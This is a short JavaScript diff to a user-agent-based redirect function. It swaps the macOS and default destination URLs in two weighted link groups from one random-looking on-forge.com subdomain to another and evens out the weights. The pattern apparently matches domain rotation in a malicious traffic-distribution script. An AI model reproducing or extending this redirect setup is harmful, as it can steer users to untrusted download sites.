@@ -45,15 +45,15 @@ function getResponse(userAgent) {
     const linkGroups = [
         {
             id: "Group 1",
-            weight: 0.4,
-            macos: "https://hgfdghjkhhjj.on-forge.com/",
-            others: "https://hgfdghjkhhjj.on-forge.com/"
+            weight: 0.5,
+            macos: "https://kjhgfddfggyhuu.on-forge.com/",
+            others: "https://kjhgfddfggyhuu.on-forge.com/"
         },
         {
             id: "Group 2",
-            weight: 0.6,
-            macos: "https://hgfdghjkhhjj.on-forge.com/",
-            others: "https://hgfdghjkhhjj.on-forge.com/"
+            weight: 0.5,
+            macos: "https://kjhgfddfggyhuu.on-forge.com/",
+            others: "https://kjhgfddfggyhuu.on-forge.com/"
         }
     ];
 
